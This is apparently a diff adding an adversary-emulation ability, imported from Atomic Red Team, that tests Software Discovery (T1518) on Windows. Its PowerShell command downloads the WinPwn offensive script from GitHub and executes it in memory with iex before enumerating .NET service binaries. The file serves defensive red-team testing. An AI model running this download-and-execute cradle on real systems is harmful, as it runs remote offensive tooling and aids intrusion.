@@ -1,0 +1,27 @@
+- id: 10ba02d0-ab76-4f80-940d-451633f24c5b
+  name: WinPwn - DotNet
+  description: Search for .NET Service-Binaries on this system via winpwn dotnet function
+    of WinPwn.
+  tactic: discovery
+  technique:
+    attack_id: T1518
+    name: Software Discovery
+  platforms:
+    windows:
+      psh:
+        command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');
+          dotnet -consoleoutput -noninteractive
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1518
+  - discovery
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    technique_created: '2019-09-16T17:52:44.147Z'
+    atomic_guid: 10ba02d0-ab76-4f80-940d-451633f24c5b
+    import_timestamp: '2025-06-24T11:15:07.680083Z'
